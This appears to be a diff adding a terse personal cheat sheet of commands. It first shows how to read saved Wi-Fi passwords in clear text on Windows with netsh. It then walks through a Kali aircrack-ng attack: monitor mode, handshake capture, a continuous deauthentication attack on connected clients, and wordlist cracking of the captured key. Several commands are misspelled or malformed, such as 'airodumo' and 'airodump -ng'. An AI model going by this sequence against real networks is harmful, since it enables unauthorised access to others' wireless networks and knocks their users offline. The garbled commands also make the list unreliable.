@@ -1,0 +1,17 @@
+ncpa.cpl
+
+cmd
+netsh wlan show profiles
+netsh wlan show profile name=ex key=clear
+
+kali
+sudo apt install aircrack-ng
+sudo airmon-ng check kill
+iwconfig
+sudo airmon-ng start wlan0
+iwconfig
+sudo airodumo wlan0
+sudo airodumo wlan0 -f `wifi_id`
+sudo airodump -ng -w `file_name` -c `channel` --bssid `bssid` wlan0  ---> on a new terminal instance ---> sudo aireplay-ng --deauth 0 -a `wifi_id` -c `station_id` wlan0
+ls
+sudo aircrack-ng `filename` -w `directory`
